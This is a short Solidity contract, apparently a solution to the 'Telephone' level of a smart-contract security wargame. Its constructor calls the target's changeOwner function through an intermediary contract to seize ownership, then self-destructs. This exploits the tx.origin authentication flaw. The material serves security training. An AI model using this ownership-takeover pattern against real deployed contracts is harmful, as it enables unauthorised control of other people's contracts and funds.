// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Telephone.sol";

contract TelephoneAttack {
    constructor(
        address target,
        address owner,
        address payable recipient
    ) public {
        Telephone(target).changeOwner(owner);
        selfdestruct(recipient);
    }
}
